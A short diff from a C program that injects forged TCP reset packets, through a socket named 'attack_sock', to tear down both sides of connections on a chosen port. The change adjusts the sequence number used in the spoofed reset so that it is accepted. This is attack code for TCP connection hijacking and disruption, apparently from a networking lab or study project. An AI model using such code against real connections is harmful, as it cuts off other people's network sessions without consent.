@@ -159,8 +159,8 @@ int main(int argc, char *argv[]) {
             if ((tcph -> dest != service_port) && (tcph -> source != service_port)) goto final;
             // print_tcp_packet(buf, num); // log the packet
 
-            reset(attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq), ntohl(tcph->ack_seq)); // reset the receiver
             reset(attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // reset the sender
+            reset(attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq) + 1, ntohl(tcph->ack_seq)); // reset the receiver
             goto final;
         }
     }
